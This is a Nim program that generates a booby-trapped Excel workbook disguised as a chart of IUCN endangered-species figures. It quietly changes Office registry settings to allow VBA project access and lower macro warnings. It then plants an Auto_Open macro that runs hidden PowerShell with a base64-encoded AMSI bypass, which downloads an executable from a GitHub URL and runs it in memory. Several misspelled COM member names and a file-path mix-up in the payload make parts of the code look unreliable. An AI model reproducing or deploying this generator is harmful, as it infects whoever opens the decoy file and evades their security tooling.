import winim/com
import strformat
import os


let xlfilename = paramStr(1)
comScript:
    var objExcel = CreateObject("Excel.Application")
    var WshShell = CreateObject("WScript.Shell")
    var Application_Version = objExcel.Version

    var strVBOMRegPath = fmt"HKEY_CURRENT_USER\Software\Microsoft\Office\{Application_Version}\Excel\Security\AcessVBOM"
    var strVBAWarnRegPath = fmt"HKEY_CURRENT_USER\Software\Microsoft\Office\{Application_Version}\Excel\Security\VBAWarnings"
    WshShell.RegWrite(strVBOMRegPath, 1, "REG_DWORD")
    WshShell.RegWrite(strVBAWarnRegPath, 1, "REG_DWORD")

    objExcel.visible = false
    objExcel.sheetsInNewWorkBook = 1
    objExcel.dispalyalerts = false

    var objWorkbook = objExcel.workbooks.add()
    var xlmodule = objWorkbook.VBProject.VBComponenets.Add(1)
    var strMacroRevShell = """Sub Auto_Open()
    Call Shell("cmd.exe /c powershell.exe IEX(echo [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JGsgPSAkKCI0MSA2RCA3MyA2OSA1NSA3NCA2OSA2QyA3MyIuU3BsaXQoIiAiKXxmb3JFYWNoe1tjaGFyXShbY29udmVydF06OnRvaW50MTYoJF8sMTYpKX18Zm9yRWFjaHskcmVzdWx0PSRyZXN1bHQrJF99OyRyZXN1bHQpOwokdyA9ICQoIjYxIDZEIDczIDY5IDQ5IDZFIDY5IDc0IDQ2IDYxIDY5IDZDIDY1IDY0Ii5TcGxpdCgiICIpfGZvckVhY2h7W2NoYXJdKFtjb252ZXJ0XTo6dG9pbnQxNigkXywxNikpfXxmb3JFYWNoeyRyZXN1bHQ9JHJlc3VsdCskX307JHJlc3VsdCkuU3Vic3RyaW5nKDksMTQpOwpbUmVmXS5Bc3NlbWJseS5HZXRUeXBlKCdTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLicgKyAkaykuR2V0RmllbGQoJHcsICdOb25QdWJsaWMsU3RhdGljJykuU2V0VmFsdWUoJG51bGwsICR0cnVlKTsKJHBhdGggPSAoSW52b2tlLVdlYlJlcXVlc3QgJ2h0dHBzOi8vZ2l0aHViLmNvbS9iYWthcmlsZXZ5L2tpbGxjaGFpbi9JbmplY3Rpb24uZXhlJykuQ29udGVudDsKJGJ5dGVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRwYXRoKTsKJGFzc2VtYmx5ID0gW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZCgkYnl0ZXMpOwokZW50cnlQb2ludE1ldGhvZCA9ICRhc3NlbWJseS5HZXRUeXBlcygpLldoZXJlKHsgJF8uTmFtZSAtZXEgJ1Byb2dyYW0nIH0sICdGaXJzdCcpLkdldE1ldGhvZCgnTWFpbicsIFtSZWZsZWN0aW9uLkJpbmRpbmdGbGFnc10gJ1N0YXRpYywgUHVibGljLCBOb25QdWJsaWMnKTsKJGVudHJ5UG9pbnRNZXRob2QuSW52b2tlKCRudWxsLCAoLCBbc3RyaW5nW11dICgkbnVsbCkpKTs=")) -nop -windowstyle hidden -)", 1)
    """
    xlmodule.CodeModule.AddFromString(strMacroRevShell)
    objExcel.activeSheet.name = "Critically Endangered"

    for i, j in ["Mammals", "Birds", "Reptiles", "Fishes", "Plants"]:
        objExcel.activeSheet.cells(1, i + 1) = j # This line needs comScript macro
    
    for cell in objExcel.activeSheet.range("A1:E1"):
        cell.interior.color = RGB(0xee, 0xdd, 0x82)
        cell.interior.pattern = 1
        cell.font.size = 13
        cell.borders.color = RGB(0, 0, 0)
        cell.borders.lineStyle = 1
        cell.borders.weight = 2

    var sheet = objExcel.activeSheet
    sheet.range("A2").value = 184
    sheet.range("B2").value = 182
    sheet.range("C2").value = 57
    sheet.range("D2").value = 162
    sheet.range("E2").value = 1276

    sheet.range("A4:E4").merge()
    sheet.range("A4").value = "Source: IUCN Red List 2003"
    sheet.range("A1:E2").borderAround(1, 2, nil.variant, RGB(0, 0, 0))

    sheet.columns("A1:E2").columnWidth = 12.5

    var xrange = objExcel.activeSheet.range("A1:E2")
    var xchart = objWorkbook.charts.add()
    xchart.chartWizard(xrange, -4100, 7, 1, 1, 0, false, "Critically Endangered Animals and Plants")
    xchart.HashAxis(3) = false
    objWorkbook.SaveAs(xlfilename, FileFormat:=56, Password:="", WriteResPassword:="", ReadOnlyRecommended:=FALSE, CreateBackup:=0, AccessMode:=1, ConflictResolution:=3, AddToMru:=0, TextCodepage:=0, TextVisualLayout:=0, Local:=0)
    WshShell.RegWrite(strVBOMRegPath, 0, REG_DWORD)
    WshShell.RegWrite(strVBAWarnRegPath, 0, REG_DWORD)
    objExcel.DisplayAlerts = false
    objWorkbook.Close(false)
    COM_FullRelease() # Make sure excel.exe will end itself